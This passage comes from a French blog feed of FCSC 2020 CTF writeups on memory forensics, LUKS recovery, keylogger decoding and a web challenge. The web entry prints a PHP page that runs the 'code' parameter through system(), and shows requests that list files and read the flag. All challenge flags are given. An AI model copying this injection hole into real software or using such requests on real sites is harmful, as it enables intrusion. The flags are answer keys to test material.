+TCP      fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED                  ncat/1515 
+TCP      10.42.42.131    :47106 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :55224 151.101.121.140 :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :55226 151.101.121.140 :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :53190 104.124.192.89  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :45652 35.190.72.21    :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :47102 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :47104 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :38186 216.58.213.142  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :47100 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :50612 104.93.255.199  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :58772 185.199.111.154 :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :38184 216.58.213.142  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :57000 10.42.42.134    :   22 ESTABLISHED                   ssh/119468
+TCP      fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED                    sh/119511
+TCP      127.0.0.1       :38498 127.0.0.1       :34243 ESTABLISHED                   cli/119514
+TCP      127.0.0.1       :34243 127.0.0.1       :38498 ESTABLISHED                   cli/119514
+TCP      10.42.42.131    :51858 10.42.42.128    :  445 ESTABLISHED             smbclient/119577</span></code></pre></figure>
+
+<p>Sauf qu’ici, nous avons des doublons d’adresse de destination. Il n’y a pas beaucoup de résultats, je peux donc supprimer des lignes ou la destination est la même à la main, ce qui donne :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">TCP      10.42.42.131    :36970 116.203.52.118  :  443 ESTABLISHED                   tor/706  
+TCP      10.42.42.131    :37252 163.172.182.147 :  443 ESTABLISHED                   tor/706  
+TCP      fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED                  ncat/1515 
+TCP      10.42.42.131    :47106 216.58.206.226  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :55224 151.101.121.140 :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :53190 104.124.192.89  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :45652 35.190.72.21    :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :38186 216.58.213.142  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :50612 104.93.255.199  :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :58772 185.199.111.154 :  443 ESTABLISHED              chromium/119187
+TCP      10.42.42.131    :57000 10.42.42.134    :   22 ESTABLISHED                   ssh/119468
+TCP      127.0.0.1       :38498 127.0.0.1       :34243 ESTABLISHED                   cli/119514
+TCP      10.42.42.131    :51858 10.42.42.128    :  445 ESTABLISHED             smbclient/119577</span></code></pre></figure>
+
+<p>Le nombre de connexion est donc : <strong><em>13</em></strong></p>
+
+<h1 id="flag">Flag</h1>
+
+<p>Le flag est donc : <strong><em>FCSC{pool-xfconfd:nmap -sS -sV 10.42.42.0/24:13}</em></strong></p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="forensic" /><category term="ctf" /><category term="writeup" /><summary type="html"><![CDATA[Toujours dans la série Académie de l’investigation, ceci est mon writeup pour le France CyberSecurity Challenge de 2020, sur le challenge Premier Artéfacts. Le but est de retrouver des infos sur un processus, une commande et une connexion réseau.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Forensics - Académie de l’investigation - C’est la rentrée</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-la-rentre.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Forensics - Académie de l’investigation - C’est la rentrée" /><published>2020-05-05T19:00:08+02:00</published><updated>2020-05-05T19:00:08+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-la-rentre</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-la-rentre.html"><![CDATA[<p>Voici mon writeup sur la première épreuve de forensic de la série <em>Académie de l’investigation</em> pour France CyberSecurity Challenge de 2020. Le but est de retrouver des infos sur l’utilisateur et la machine dont un dump mémoire a été fournit. <!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+
+<blockquote>
+  <p>Bienvenue à l’académie de l’investigation numérique ! Votre mission, valider un maximum d’étapes de cette série afin de démontrer votre dextérité en analyse mémoire GNU/Linux.</p>
+
+  <p>Première étape : retrouvez le <strong>HOSTNAME</strong>, le nom de l’<strong>utilisateur</strong> authentifié lors du dump et la <strong>version</strong> de Linux sur lequel le dump a été fait.</p>
+
+  <p>Format du flag : <em>FCSC{hostname:user:x.x.x-x-amdxx}</em></p>
+</blockquote>
+
+<h1 id="solution">Solution</h1>
+
+<p>Nous avons donc un dump de la mémoire d’une machine linux, on peut donc utiliser volatility pour l’analyser. En revanche, nous ne savons pas quel profile nous devons créer pour analyser ce dump. J’utilise donc dans un premier temps la commande <em>Strings</em> qui va me permettre de déterminer la distribution et la version du noyau.</p>
+
+<h2 id="obtention-dinformations-avec-strings">Obtention d’informations avec Strings</h2>
+
+<ul>
+  <li>Je créé un fichier text avec toutes les chaines de caractères du dump :</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">strings dmp.mem &gt;</span><span class="w"> </span>dmp.txt</code></pre></figure>
+
+<h3 id="version">Version</h3>
+<ul>
+  <li>Je cherche avec <em>grep</em>, par exemple :</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">cat dmp.txt | grep amd64</span></code></pre></figure>
+
+<ul>
+  <li>Cela me permet de retrouver la version du noyau :</li>
+</ul>
+
+<blockquote>
+  <p>5.4.0-4-amd64</p>
+</blockquote>
+
+<ul>
+  <li>Ainsi que la distribution linux utilisé :</li>
+</ul>
+
+<blockquote>
+  <p>0-4-amd64 <strong>Debian</strong> GNU/Linux <strong>bullseye/sid</strong></p>
+</blockquote>
+
+<h3 id="hostname">Hostname</h3>
+<p>Et puisque j’ai mon fichier text j’en profite pour voir si je ne peux pas trouver d’autres informations.</p>
+
+<p>Je repère le hostname :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">cat </span>dmp.txt | <span class="nb">grep </span>HOSTNAME
+<span class="go">_HOSTNAME=challenge.fcsc</span></code></pre></figure>
+
+<h3 id="utilisateur">Utilisateur</h3>
+
+<p>Enfin pour le nom d’utilisateur :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">cat </span>dmp.txt | <span class="nb">grep</span> /home/
+<span class="go">/home/Lesage/.local/share
+/home/Lesage/.icons/gnome
+/home/Lesage/.mozilla/firefox/peyjyk3f.default-esr/logins.json</span></code></pre></figure>
+
+<h1 id="flag">Flag</h1>
+
+<p>On a donc :</p>
+<ul>
+  <li>Hostname : challenge.fcsc</li>
+  <li>Username : Lesage</li>
+  <li>Version : 5.4.0-4-amd64</li>
+</ul>
+
+<p>Le flag est donc : <strong><em>FCSC{challenge.fcsc:Lesage:5.4.0-4-amd64}</em></strong></p>
+
+<h2 id="création-du-profile-volatility">Création du profile volatility</h2>
+
+<p>Grâce aux informations récupérées avec strings, je créé un profile volatility pour Debian bullseye/sid 5.4.0-4-amd64. Ce profile me permettra de réaliser les prochains challenge de cette série.</p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="forensic" /><category term="ctf" /><category term="writeup" /><summary type="html"><![CDATA[Voici mon writeup sur la première épreuve de forensic de la série Académie de l’investigation pour France CyberSecurity Challenge de 2020. Le but est de retrouver des infos sur l’utilisateur et la machine dont un dump mémoire a été fournit.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Forensics - Find Me</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-find-me.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Forensics - Find Me" /><published>2020-05-05T19:00:07+02:00</published><updated>2020-05-05T19:00:07+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-find-me</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-find-me.html"><![CDATA[<p><em>Find Me</em> est une des épreuves de forensic du <em>France Cybersecurity Challenge 2020</em> qui m’a apporté le plus de satisfaction. En effet ayant suivi la formation gratuite de 8h sur autopsy (que je ne connaissais pas avant), j’ai pu appliquer ce que j’ai appris sur cette formation.<!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+<blockquote>
+  <p>Vous avez accès à un fichier <em>find_me</em> qui semble renfermer un secret bien gardé, qui n’existe peut-être même plus. Retrouvez son contenu !</p>
+</blockquote>
+
+<h1 id="solution">Solution</h1>
+
+<p>Dans un premier temps, je check le type du fichier <em>find_me</em> :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span>file find_me 
+<span class="go">find_me: Linux rev 1.0 ext4 filesystem data, UUID=9c0d2dc5-184c-496a-ba8e-477309e521d9, volume name "find_me" (needs journal recovery) (extents) (64bit) (large files) (huge files)</span></code></pre></figure>
+
+<p>On a donc un système de fichier ext4, que je m’empresse d’ouvrir dans <em>Autopsy</em>. Une fois le scan terminé, je remarque des fichiers qui ont été supprimés.</p>
+
+<ul>
+  <li>Celui qui attire le plus mon attention est <em>unlock_me</em>. C’est un fichier qui semble chiffré avec <a href="https://en.wikipedia.org/wiki/Linux_Unified_Key_Setup">LUKS</a>.</li>
+</ul>
+
+<p style="text-align: center;"><img src="/assets/2020/05/findme-unlockme.png" alt="Find Me - unlock_me" /></p>
+
+<ul>
+  <li>Bien évidemment le fichier <em>pass.b64</em> ne donne pas la clé pour déchiffrer, mais elle donne une indication :</li>
+</ul>
+
+<p style="text-align: center;"><img src="/assets/2020/05/findme-passb64.png" alt="Find Me - pass.b64" /></p>
+
+<ul>
+  <li>Je rassemble donc tous les fichiers <em>partXX</em> et j’obtiens :</li>
+</ul>
+
+<blockquote>
+  <p>TWYtOVkyb01OWm5IWEtzak04cThuUlRUOHgzVWRZ</p>
+</blockquote>
+
+<p>Ce qui donne <em>Mf-9Y2oMNZnHXKsjM8q8nRTT8x3UdY</em> une fois décodé depuis base64.</p>
+
+<ul>
+  <li>Puis j’ai un peu galérer pour déchiffrer mais finalement :</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">sudo </span>cryptsetup open <span class="nt">--type</span> luks <span class="nt">--key-file</span><span class="o">=</span>keyfile <span class="nt">--cipher</span><span class="o">=</span>aes-xts-plain64 unlock_me unlockedfile
+<span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">sudo </span>mount /dev/mapper/unlockedfile mount/
+<span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">cd </span>mount/
+<span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-liah</span>
+<span class="go">total 4,0K
+    271 drwxr-xr-x 2 root    root      92  1 avril 21:54 .
+1892645 drwxr-xr-x 7 vixepti vixepti 4,0K 25 avril 17:45 ..
+    272 -r-------- 1 root    root      70  1 avril 21:54 .you_found_me
+</span><span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">cat</span> .you_found_me
+<span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">sudo cat</span> .you_found_me 
+<span class="gp">FCSC{750322d61518672328c856ff72fac0a80220835b9864f60451c771ce6f9aeca1}[vixepti@microwave mount]$</span><span class="w"> </span></code></pre></figure>
+
+<h1 id="flag">Flag</h1>
+
+<p>La flag est donc : <strong><em>FCSC{750322d61518672328c856ff72fac0a80220835b9864f60451c771ce6f9aeca1}</em></strong></p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="ctf" /><category term="writeup" /><category term="forensic" /><summary type="html"><![CDATA[Find Me est une des épreuves de forensic du France Cybersecurity Challenge 2020 qui m’a apporté le plus de satisfaction. En effet ayant suivi la formation gratuite de 8h sur autopsy (que je ne connaissais pas avant), j’ai pu appliquer ce que j’ai appris sur cette formation.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Forensics - Petite Frappe 2</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-petite-frappe-2.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Forensics - Petite Frappe 2" /><published>2020-05-05T19:00:06+02:00</published><updated>2020-05-05T19:00:06+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-petite-frappe-2</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-petite-frappe-2.html"><![CDATA[<p>Comme pour le <a href="/writeup/2020/05/05/fcsc-2020-writeup-petite-frappe-1.html">Petite frappe 1</a>, j’ai flag salement. Je vais éditer rapidement avec une amélioration dans les prochains jours…<!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+
+<blockquote>
+  <p>Lors de l’investigation d’un poste GNU/Linux, vous analysez un nouveau fichier qui semble être généré par un programme d’enregistrement de frappes de clavier. Retrouvez ce qui a bien pu être écrit par l’utilisateur de ce poste à l’aide de ce fichier !</p>
+
+  <p>Format du flag : <em>FCSC{xxx}</em>, où <em>xxx</em> est la chaîne que vous aurez trouvée.</p>
+</blockquote>
+
+<h1 id="solution">Solution</h1>
+
+<p>Bon comme je disais en intro, c’est vraiment dégueulasse, mais j’ai récupéré chaque valeur en face d’un <em>key press</em> :</p>
+
+<blockquote>
+  <p>46 46 24 65 24 65 39 32 46 30 28 31 32 57 65 24 55 26 54 65 54 65 53 31 57 33 30 28 65 57 26 65 26 65 39 26 26 47 56 46 26 65 26 65 33 24 39 65 39 65 39 30 33 26 27 65 33 27 24 28 31 38 30 26 65 24 65 24 65 40 26 40 26 54 32 40 26 27 62 59 59 62 65 46 26 65 26 65 41 46 24 42 65 26 39 28 65 30 57 17 54 46 24 55 31 26 27 17 24 25 26 27 28 29 17 26 57 17 55 24 30 28 17 40 26 30 53</p>
+</blockquote>
+
+<p>Puis j’ai comparé avec les <a href="https://gist.github.com/rickyzhang82/8581a762c9f9fc6ddb8390872552c250">keycode linux</a> :</p>
+
+<blockquote>
+  <p>lla a solution avec c xinput ne e seemble e pas s super pratique a a dedecoder62mm62 le e flag est un_clavier_azerty_en_vaut_deux</p>
+</blockquote>
+
+<h1 id="flag">Flag</h1>
+
+<p>Le flag est donc : <strong><em>FCSC{un_clavier_azerty_en_vaut_deux}</em></strong></p>
+
+<h1 id="edit">Edit</h1>
+
+<p>En fait, la solution propre était d’utiliser le script pour décoder présent sur : <a href="https://blog.rom1v.com/2011/11/keylogger-sous-gnulinux-enregistrer-les-touches-tapees-au-clavier/">blog.rom1v.com</a> :</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+</span><span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">sys</span>
+<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">def</span> <span class="nf">get_keymap</span><span class="p">():</span>
+    <span class="n">keymap</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">table</span> <span class="o">=</span> <span class="n">Popen</span><span class="p">([</span><span class="s">'xmodmap'</span><span class="p">,</span> <span class="s">'-pke'</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">).</span><span class="n">stdout</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="s">'keycode +(\d+) = (.+)'</span><span class="p">,</span> <span class="n">line</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
+        <span class="k">if</span> <span class="n">m</span> <span class="ow">and</span> <span class="n">m</span><span class="p">.</span><span class="n">groups</span><span class="p">()[</span><span class="mi">1</span><span class="p">]:</span>
+            <span class="n">keymap</span><span class="p">[</span><span class="n">m</span><span class="p">.</span><span class="n">groups</span><span class="p">()[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">groups</span><span class="p">()[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">keymap</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">keymap</span> <span class="o">=</span> <span class="n">get_keymap</span><span class="p">();</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="s">'key press +(\d+)'</span><span class="p">,</span> <span class="n">line</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
+        <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+            <span class="n">keycode</span> <span class="o">=</span> <span class="n">m</span><span class="p">.</span><span class="n">groups</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+            <span class="k">if</span> <span class="n">keycode</span> <span class="ow">in</span> <span class="n">keymap</span><span class="p">:</span>
+                <span class="k">print</span> <span class="n">keymap</span><span class="p">[</span><span class="n">keycode</span><span class="p">],</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">'?'</span> <span class="o">+</span> <span class="n">keycode</span><span class="p">,</span></code></pre></figure>
+
+<p>En excécutant ce script sur le fichier text fournit :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@microwave]$</span><span class="w"> </span><span class="nb">cat </span>petite_frappe_2.txt | python2.7 xinput-decoder.py 
+<span class="go">l a space s o l u t i o n space a v e c space x i n p u t space n e space s e m b l e space p a s space s u p e r space p r a t i q u e space a space d e c o d e r Shift_R semicolon space l e space f l a g space e s t space u n underscore c l a v i e r underscore a z e r t y underscore e n underscore v a u t underscore d e u x</span></code></pre></figure>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="ctf" /><category term="writeup" /><category term="forensic" /><summary type="html"><![CDATA[Comme pour le Petite frappe 1, j’ai flag salement. Je vais éditer rapidement avec une amélioration dans les prochains jours…]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Intro - Babel Web</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-babel-web.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Intro - Babel Web" /><published>2020-05-05T19:00:05+02:00</published><updated>2020-05-05T19:00:05+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-babel-web</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-babel-web.html"><![CDATA[<p>Mon writeup sur l’épreuve <em>Babel Web</em> du <em>France Cybersecurity Challenge 2020</em>.<!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+<blockquote>
+  <p>On vous demande d’auditer ce site en cours de construction à la recherche d’un flag.</p>
+</blockquote>
+
+<p style="text-align: center;"><img src="/assets/2020/05/babelweb-homepage.png" alt="Babel Web - Homepage" /></p>
+
+<h1 id="solution">Solution</h1>
+
+<p>En examinant le code source de la page on a :</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html&gt;</span>
+	<span class="nt">&lt;head&gt;</span>
+		<span class="nt">&lt;title&gt;</span>Bienvenue à Babel Web!<span class="nt">&lt;/title&gt;</span>
+	<span class="nt">&lt;/head&gt;</span>	
+	<span class="nt">&lt;body&gt;</span>
+		<span class="nt">&lt;h1&gt;</span>Bienvenue à Babel Web!<span class="nt">&lt;/h1&gt;</span>
+		La page est en cours de développement, merci de revenir plus tard.
+		<span class="c">&lt;!-- &lt;a href="?source=1"&gt;source&lt;/a&gt; --&gt;</span>
+	<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span></code></pre></figure>
+
+<p>En accédant à <strong><em>URL</em>/?source=1</strong> :</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'source'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="o">@</span><span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+    <span class="p">}</span>  <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]))</span> <span class="p">{</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"&lt;pre&gt;"</span><span class="p">);</span>
+        <span class="o">@</span><span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">]);</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">"&lt;pre&gt;"</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+    <span class="nt">&lt;head&gt;</span>
+        <span class="nt">&lt;title&gt;</span>Bienvenue à Babel Web!<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;/head&gt;</span>    
+    <span class="nt">&lt;body&gt;</span>
+        <span class="nt">&lt;h1&gt;</span>Bienvenue à Babel Web!<span class="nt">&lt;/h1&gt;</span>
+        La page est en cours de développement, merci de revenir plus tard.
+        <span class="c">&lt;!-- &lt;a href="?source=1"&gt;source&lt;/a&gt; --&gt;</span>
+    <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+<span class="cp">&lt;?php</span>
+    <span class="p">}</span>
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Donc si je veux afficher le contenu du dossier, je peux utiliser la commande <em>ls</em>.</p>
+
+<p><strong>_URL__/?code=ls</strong></p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">flag.php
+index.php</span></code></pre></figure>
+
+<p>Je peux donc afficher le flag en affichant le contenu du fichier avec <em>cat</em> :</p>
+
+<p><strong>_URL__/?code=cat%20flag.php</strong></p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="nt">&lt;pre&gt;</span><span class="cp">&lt;?php</span>
+	<span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"FCSC</span><span class="si">{</span><span class="nv">5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;</span></code></pre></figure>
+
+<h1 id="flag">Flag</h1>
+
+<p>Le flag est donc : <strong><em>FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}</em></strong></p>]]></content><author><name>Vixepti</name></author><category term="writeup" /><category term="FCSC" /><category term="ctf" /><category term="writeup" /><category term="web" /><summary type="html"><![CDATA[Mon writeup sur l’épreuve Babel Web du France Cybersecurity Challenge 2020.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/2020/05/FCSC.png" /><media:content medium="image" url="http://localhost:4000/assets/2020/05/FCSC.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Writeup - FCSC-2020 - Intro - Petite Frappe 1</title><link href="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-petite-frappe-1.html" rel="alternate" type="text/html" title="Writeup - FCSC-2020 - Intro - Petite Frappe 1" /><published>2020-05-05T19:00:04+02:00</published><updated>2020-05-05T19:00:04+02:00</updated><id>http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-petite-frappe-1</id><content type="html" xml:base="http://localhost:4000/writeup/2020/05/05/fcsc-2020-writeup-petite-frappe-1.html"><![CDATA[<p>J’ai pas mal hésité à publier ce writeup ainsi que celui pour le challenge <a href="/writeup/2020/05/05/fcsc-2020-writeup-petite-frappe-2.html">Petite frappe 2</a>, parce que j’ai flag vraiment salement. Mais finalement je publie avec pour objectif d’apporter une amélioration dans les prochains jours pour faire ça plus proprement. Ça soulagera ma conscience.<!--more--></p>
+
+<h1 id="énoncé">Énoncé</h1>
+
+<blockquote>
+  <p>Lors de l’investigation d’un poste GNU/Linux, vous analysez un fichier qui semble être généré par un programme d’enregistrement de frappes de clavier (enregistrement de l’activité de chaque touche utilisée).</p>
+
+  <p>Retrouvez ce qui a bien pu être écrit par l’utilisateur de ce poste à l’aide de ce fichier !</p>
+
+  <p>Format du flag : Pour valider ce challenge, vous devez insérer le contenu de ce qui a été écrit sur le clavier de ce poste dans la balise suivante <em>FCSC{xxxxxx}</em> puis soumettre votre réponse.</p>
+</blockquote>
+
+<h1 id="solution">Solution</h1>
+
+<p>J’ai relevé chaque lettre de chaque <em>EV_KEY</em>. Exemple :</p>
+
+<blockquote>
+  <p>Event: time 1584656705.424839, ————– SYN_REPORT ————</p>
+
+  <p>Event: time 1584656706.404214, type 4 (EV_MSC), code 4 (MSC_SCAN), value 16</p>
+
+  <p>Event: time 1584656706.404214, type 1 (EV_KEY), code 22 (<strong>KEY_U</strong>), value 1</p>
+
+  <p>Event: time 1584656706.404214, ————– SYN_REPORT ————</p>
+
+  <p>Event: time 1584656706.508350, type 4 (EV_MSC), code 4 (MSC_SCAN), value 16</p>
+
+  <p>Event: time 1584656706.508350, type 1 (EV_KEY), code 22 (<strong>KEY_U</strong>), value 0</p>
+
+  <p>Event: time 1584656706.508350, ————– SYN_REPORT ————</p>
+
+  <p>Event: time 1584656706.674591, type 4 (EV_MSC), code 4 (MSC_SCAN), value 31</p>
+
+  <p>Event: time 1584656706.674591, type 1 (EV_KEY), code 49 (<strong>KEY_N</strong>), value 1</p>
+</blockquote>
+
+<p>Ça donne : <strong>UUN</strong></p>
+
+<h1 id="flag">Flag</h1>
+
+<p>Le flag est donc : <strong><em>FCSC{UNEGENTILLEINTRODUCTION}</em></strong></p>
+
+<h1 id="edit">Edit</h1>
+
+<p>Bon du coup, comme promis j’ai rapidement repris ce challenge plus proprement. J’utilise donc la commande <strong>awk</strong> :</p>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">[vixepti@computer]$</span><span class="w"> </span><span class="nb">cat </span>petite_frappe_1.txt | <span class="nb">grep</span> <span class="s1">'EV_KEY'</span> | <span class="nb">awk</span> <span class="s1">'{if(NR % 2) print substr($9,6,1)}'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">''</span>
+<span class="go">UNEGENTILLEINTRODDCTION</span></code></pre></figure>
+
+<p>Et pour mieux comprendre, je vais détailler :</p>
+
+<ul>
+  <li>J’affiche le contenu du fichier fournit :</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">cat petite_frappe_1.txt</span></code></pre></figure>
+
+<ul>
+  <li>Je filtre sur la chaîne de caractères <em>EV_KEY</em> :</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">| grep 'EV_KEY'</span></code></pre></figure>
+
+<ul>
+  <li>J’affiche uniquement une ligne sur deux (sinon je me retrouve avec chaque caractère en double) :</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="go">| awk '{if(NR % 2)</span></code></pre></figure>
+
+<ul>
+  <li>J’affiche le 6<sup>ème</sup> caractère de la 9<sup>ème</sup> colonne (celle qui contient la touche clavier : KEY_?) :</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-shell_session" data-lang="shell_session"><span class="gp">print substr($</span>9,6,1<span class="o">)}</span><span class="s1">'</span></code></pre></figure>
+
